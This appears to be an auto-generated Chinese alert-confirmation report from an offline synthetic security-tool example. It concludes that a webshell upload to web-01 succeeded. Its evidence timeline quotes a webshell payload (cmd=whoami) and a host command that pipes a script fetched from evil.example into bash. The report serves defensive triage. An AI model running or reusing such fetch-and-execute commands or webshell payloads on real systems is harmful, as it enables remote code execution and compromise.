# 数据取数统计

离线合成案例；本次未连接 ES/SLS、使用凭证或发送通知。

查询计数来自结果元数据；输入预录的查询成功／超时也会计入，不能视为本次真实联网。

| 记录数 | 累计取数 | 请求 | 查询 | 失败查询 | 查询完整性 |
|---|---|---|---|---|---|
| 5 | 0 | 0 | 0 | 0 | unknown |

| 数据类型 | 记录数 |
|---|---|
| web\_access\_log | 1 |
| host\_exec | 1 |
| host\_connect | 1 |
| host\_file\_op | 1 |
| waf\_alert | 1 |

| 去重 | 窗口过滤 | 截断类型 |
|---|---|---|
| 0 | 0 | \[\] |

逐资产取数明细为空；离线输入不等于生产环境完整覆盖。

| 开始时间 | 结束时间 | 告警锚点 |
|---|---|---|
| 未提供 | 未提供 | 2026-06-21T09:10:00+08:00 |

## 确认 WebShell 攻击是否成功

**结构化结果报告（自动生成，尚待智能体证据复核）。** 本文不声称已完成 AI 叙事分析。

案例：webshell-attack-confirmation；Skill：alert-confirmation。

### 结论

规则判为真实攻击（confirmed\_attack） / 确认成功（success\_confirmed）

| 原始置信度 | 顶层上限 | 证据约束建议上限 | 证据范围 |
|---|---|---|---|
| 0.88 | 0.88 | 0.85 | supplied\_evidence\_only |

规则判定不等于每个攻击阶段都已证实；空结果或未达阈值不能证明安全。应同时考虑证据约束上限。

### 告警真实性与攻击结果

| 告警 | 真实性 | 攻击结果 | 成功证据 | 原始置信度 | 建议动作 |
|---|---|---|---|---|---|
| WAF-20260621-002 | 规则判为真实攻击（confirmed\_attack） | 确认成功（success\_confirmed） | \["exec-101", "connect-101", "file-101"\] | 0.88 | 升级调查，建议隔离受害主机 |

WAF-20260621-002：检测到 webshell 攻击特征: shell.php, cmd=。活动级结果：确认成功（success\_confirmed）。

### 原始证据时间线

| 时间 | 来源 | 证据 ID | 主机／目标 | 记录 |
|---|---|---|---|---|
| 2026-06-21T09:10:04+08:00 | web\_access\_log | web-101 | 192.0.2.10 | 来源：203.0.113.10；路径：/upload/shell.php；响应状态：200 |
| 2026-06-21T09:10:05+08:00 | primary\_alert | WAF-20260621-002 | web-01 | 来源：203.0.113.10；路径：/upload/shell.php；载荷：cmd=whoami；动作：logged |
| 2026-06-21T09:11:50+08:00 | host\_file\_op | file-101 | web-01 | 动作：create；文件：/var/www/html/upload/shell.php |
| 2026-06-21T09:12:28+08:00 | host\_connect | connect-101 | web-01 | 目的：198.51.100.5；目的端口：80 |
| 2026-06-21T09:12:30+08:00 | host\_exec | exec-101 | web-01 | 命令：\['/bin/sh', '-c', 'curl http://evil.example/a.sh &#124; bash'\] |

### 数据缺口与结论边界

未单列缺口，不代表证据完整。

上述动作均为建议，本次未执行隔离、封禁或凭证修改。

### 可复核来源

[离线输入](</Users/op/Desktop/%E9%A1%B9%E7%9B%AE/secweaver-community-0.3.21/examples/alert-confirmation/s4-webshell-attack-success.json>) · [本次 JSON](</Users/op/Desktop/%E9%A1%B9%E7%9B%AE/secweaver-community-0.3.21/outputs/ai-showcase/webshell-attack-confirmation.json>)
